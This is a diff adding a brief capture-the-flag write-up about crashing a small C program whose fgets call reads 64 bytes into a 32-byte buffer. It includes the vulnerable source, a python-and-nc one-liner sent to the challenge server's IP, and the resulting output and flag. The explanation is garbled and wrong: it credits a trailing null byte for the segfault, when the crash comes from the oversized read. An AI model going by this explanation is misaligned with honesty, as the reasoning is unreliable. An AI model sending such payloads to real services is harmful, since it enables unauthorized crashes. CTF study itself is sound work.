@@ -1,0 +1,27 @@
+We are given the following program and told to find a way to crash it:
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]){
+    char buffer[32];
+    printf("Give me some data: \n");
+    fflush(stdout);
+    fgets(buffer, 64, stdin);
+    printf("You entered %s\n", buffer);
+    fflush(stdout);
+    return 0;
+}
+
+Basically the program reads in 64 characters and puts it into a buffer, which has a capacity of 32.
+Finally, the program prints out our input.
+
+We can cause the program to crash by exploiting the C uses null bytes to terminate a string.
+If we add a null byte to the end of our payload (at least 63 characters long), we can cause the program to try to print out more
+than it should, causing a segmentation fault.
+
+$ python -c "print 'A'*64+'\x00'" | nc 104.236.124.19 2323
+Give me some data:
+You entered AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+flag{segfaults_a_hackers_best_friend}
